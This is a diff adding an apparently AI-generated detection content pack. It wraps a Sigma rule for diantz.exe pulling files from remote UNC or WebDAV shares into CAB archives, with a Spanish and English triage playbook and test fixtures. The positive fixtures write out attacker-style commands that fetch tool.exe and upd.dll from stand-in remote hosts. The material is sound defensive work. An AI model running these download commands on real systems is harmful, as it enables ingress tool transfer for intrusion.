@@ -1,0 +1,128 @@
+{
+  "rule": {
+    "id": "185d7418-f250-42d0-b72e-0c8b70661e93",
+    "title": "Suspicious Diantz Download and Compress Into a CAB File",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113",
+    "path": "windows/process_creation/proc_creation_win_lolbin_diantz_remote_cab.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_lolbin_diantz_remote_cab.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó diantz.exe con una ruta UNC remota y un archivo .cab de destino. Esto puede indicar que un atacante descargó un archivo desde un recurso compartido remoto y lo guardó comprimido en el equipo local.",
+      "what_it_detects": "Eventos de creación de procesos en los que CommandLine contiene diantz.exe, un espacio seguido de una ruta UNC (\\\\servidor\\recurso) y la extensión .cab. Diantz es el compresor de cabinets de Windows y es un LOLBin documentado en LOLBAS.",
+      "why_it_matters": "Un binario firmado de Microsoft puede traer herramientas desde SMB o WebDAV sin usar descargadores obvios (ATT&CK T1105, Ingress Tool Transfer). Además, el formato CAB oculta el contenido ante controles simples.",
+      "triage_steps": [
+        "Revise CommandLine e identifique el servidor UNC de origen, el archivo remoto y la ruta del .cab que se generó.",
+        "Valide el ParentImage y la cadena de procesos: es sospechoso que lo lance cmd, powershell, wscript, mshta o una aplicación de Office.",
+        "Confirme el usuario y si suele hacer tareas de empaquetado. Una cuenta de servicio o un usuario sin perfil técnico aumenta el riesgo.",
+        "Busque conexiones de red del host hacia el servidor UNC por SMB/445 o WebDAV/80-443 y determine si es interno o externo.",
+        "Ubique el .cab en disco, obtenga su hash y revise su contenido de forma aislada, o consulte el hash en su plataforma de threat intel.",
+        "En el mismo host, dentro de +/- 15 minutos, busque expand.exe, extrac32.exe o la ejecución de los archivos que se extrajeron.",
+        "Revise si hay alertas previas para el mismo host, el mismo usuario o el mismo servidor remoto."
+      ],
+      "false_positives": [
+        "La regla no indica falsos positivos conocidos.",
+        "Scripts de empaquetado o despliegue de TI que comprimen archivos desde recursos compartidos internos con diantz.",
+        "Procesos de compilación de instaladores que generan CAB a partir de rutas de red."
+      ],
+      "response_steps": [
+        "Verifique con el usuario o el equipo de TI si la ejecución fue legítima y documente el resultado.",
+        "Si es maliciosa, aísle el endpoint y bloquee el servidor UNC de origen en el firewall o el proxy.",
+        "Ponga en cuarentena el .cab y los archivos que se extrajeron, y busque su hash en otros equipos.",
+        "Restablezca las credenciales del usuario si hay indicios de que se comprometieron, y restaure el equipo desde una línea base confiable."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque el uso de diantz con origen remoto es poco común y sirve para transferir herramientas, aunque algunos procesos administrativos pueden producirlo."
+    },
+    "en": {
+      "summary": "diantz.exe ran with a remote UNC path and a .cab output file. An attacker may have pulled a file from a remote share and stored it compressed on the local host.",
+      "what_it_detects": "Process creation events where CommandLine contains diantz.exe, a space followed by a UNC path (\\\\server\\share) and a .cab extension. Diantz is the Windows cabinet maker and a documented LOLBAS binary.",
+      "why_it_matters": "A signed Microsoft binary can fetch tools over SMB or WebDAV without obvious downloaders (ATT&CK T1105, Ingress Tool Transfer). The CAB packaging also hides the payload from simple inspection.",
+      "triage_steps": [
+        "Parse CommandLine for the source UNC server, the remote file name and the output .cab path.",
+        "Check ParentImage and the process tree. A parent such as cmd, powershell, wscript, mshta or an Office application is suspicious.",
+        "Confirm the user and whether they normally package files. Service accounts and non-technical users raise the risk.",
+        "Look for host network connections to the UNC server over SMB/445 or WebDAV/80-443, and decide whether it is internal or external.",
+        "Locate the .cab on disk, hash it and inspect its contents safely, or look up the hash in your threat intel.",
+        "On the same host within +/- 15 minutes, look for expand.exe, extrac32.exe or execution of the extracted files.",
+        "Review earlier alerts for the same host, user or remote server."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives.",
+        "IT packaging or deployment scripts that use diantz to compress files from internal shares.",
+        "Installer build processes that create CABs from network paths."
+      ],
+      "response_steps": [
+        "Check with the user or IT whether the run was legitimate, and record the outcome.",
+        "If it was malicious, isolate the endpoint and block the source UNC server at the firewall or proxy.",
+        "Quarantine the .cab and any extracted files, then hunt for their hashes on other hosts.",
+        "Reset the user's credentials if there are signs of compromise, and rebuild the host from a trusted baseline."
+      ],
+      "severity_rationale": "Medium fits because diantz with a remote source is rare and can be used to transfer tools, but some administrative workflows can produce it."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Diantz downloads an executable from a remote SMB share and stores it as a CAB in a public folder.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\diantz.exe",
+          "CommandLine": "diantz.exe \\\\192.0.2.15\\share\\tool.exe C:\\Users\\Public\\tool.cab",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c diantz.exe \\\\192.0.2.15\\share\\tool.exe C:\\Users\\Public\\tool.cab",
+          "CurrentDirectory": "C:\\Users\\jperez\\"
+        }
+      },
+      {
+        "description": "Diantz launched from PowerShell by its full path, pulling a DLL from a WebDAV host.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mlopez",
+          "Image": "C:\\Windows\\System32\\diantz.exe",
+          "CommandLine": "C:\\Windows\\System32\\diantz.exe \\\\files.example.org@SSL\\DavWWWRoot\\upd.dll C:\\ProgramData\\upd.cab",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Diantz compresses a local report into a CAB. There is no UNC source path.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\diantz.exe",
+          "CommandLine": "diantz.exe C:\\Temp\\report.txt C:\\Temp\\report.cab",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "A build server runs Diantz with a local directive file. There is no UNC path and no .cab in the command line.",
+        "event": {
+          "EventID": 1,
+          "Computer": "BUILD-01.andes.example.com",
+          "User": "ANDES\\svc_build",
+          "Image": "C:\\Windows\\System32\\diantz.exe",
+          "CommandLine": "diantz.exe /f C:\\build\\setup.ddf",
+          "ParentImage": "C:\\Program Files\\Git\\bin\\bash.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
